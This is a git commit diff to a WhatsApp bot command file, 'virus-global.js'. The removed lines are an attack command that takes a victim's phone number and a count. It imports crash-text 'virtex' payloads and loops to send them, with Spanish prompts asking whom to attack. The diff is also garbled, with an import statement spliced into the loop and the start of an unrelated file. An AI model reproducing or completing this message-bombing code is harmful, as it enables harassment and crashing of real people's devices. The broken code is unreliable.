8fdd9e9be6ea859f910e50c8660a95ea71d310f1
VIRUZZ-OFC <113963745+VIRUZOFC@users.noreply.github.com>
2023-02-24 19:57:45 -0300

    Update virus-global.js

--- comandos/virus-global.js
+++ comandos/virus-global.js
@@ -1,24 +1,4 @@
-*//By https://github.com/DIEGO-OFC
-
-import virtex from "../virtex/index.js";
-
-let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
-    if (!(isOwner || isPrems)) {
-        global.dfail('premium', m, conn)
-        throw false
-    }
-    if (!text) throw `[❕] uhm... ¿quién quiere atacar?\n ejemplo de uso:\n *${usedPrefix + command}* número\n ejemplo: *${usedPrefix + command}* +57*******`;
-    let [orang, jumlah] = text.split(',')
-    if (!jumlah) throw '.\n\n[❕] introduce la cantidad\n.sbug +38999999999...., 10'
-    m.reply('_Procesando..._')
-    let who
-    try {
-        if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        else who = orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        if (who.length <= 20) throw '*[❕] Responder o etiquetar a las personas que quieren ser atacadas!*';
-        conn.logger.info(`\nVictima: ${who}\nCantidad: ${jumlah}`)
-        for (let i = jumlah; i > 1; i--) {
-            import fs from 'fs'
+import fs from 'fs'
 import fetch from 'node-fetch'
 const { prepareWAMessageMedia, proto, generateWAMessageFromContent, getLastMessageInChat } = (await import('@adiwajshing/baileys')).default
 
